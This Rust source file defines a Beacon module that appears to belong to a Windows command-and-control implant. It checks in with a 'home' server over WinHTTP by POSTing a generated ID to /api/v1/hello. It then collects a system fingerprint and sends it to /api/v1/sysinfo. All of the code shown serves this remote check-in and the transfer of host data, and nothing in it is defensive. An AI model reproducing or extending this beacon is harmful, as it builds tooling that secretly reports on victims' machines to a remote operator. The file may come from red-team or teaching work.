pub mod client;
use client::*;
use log::info;
use std::{
    net::SocketAddrV4,
    time::{SystemTime, UNIX_EPOCH},
};
use windows::core::HSTRING;

use crate::collector;

pub struct Beacon {
    id: u32,
    client: Client,
    home: SocketAddrV4,
}

impl Beacon {
    pub fn new(home: SocketAddrV4) -> windows::core::Result<Self> {
        let client = Client::new()?;
        let id = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .subsec_nanos();

        Ok(Self { client, id, home })
    }

    pub fn initial_request(&mut self) -> windows::core::Result<()> {
        info!(
            "sending initial request to {}:{}",
            self.home.ip(),
            self.home.port()
        );
        let id_bytes = self.id.to_le_bytes();

        let headers = [HSTRING::from("Content-Type: application/octet-stream")];

        let header_block = build_winhttp_headers(&headers);

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("POST"),
            path: HSTRING::from("/api/v1/hello"),
            headers: Some(&header_block),
            body: Some(&id_bytes),
        };

        let resp = self.client.request(req)?;

        info!("response body: {}", resp.body);
        info!("response headers: {}", resp.headers);

        Ok(())
    }

    pub fn send_system_info(&mut self) -> windows::core::Result<()> {
        info!("collecting system info...");
        let sys_info = collector::SystemFingerprint::collect()?;

        let bytes = postcard::to_allocvec(&sys_info).unwrap_or(Vec::from("serialization error"));

        let headers = [HSTRING::from("Content-Type: application/octet-stream")];

        let header_block = build_winhttp_headers(&headers);

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("POST"),
            path: HSTRING::from("/api/v1/sysinfo"),
            headers: Some(&header_block),
            body: Some(&bytes),
        };

        let resp = self.client.request(req)?;

        info!("response body: {}", resp.body);
        info!("response headers: {}", resp.headers);

        Ok(())
    }
}

fn build_winhttp_headers(headers: &[HSTRING]) -> Vec<u16> {
    let mut buf: Vec<u16> = Vec::new();

    for header in headers {
        buf.extend(header.as_wide());
    }

    buf.push(0);
    buf
}
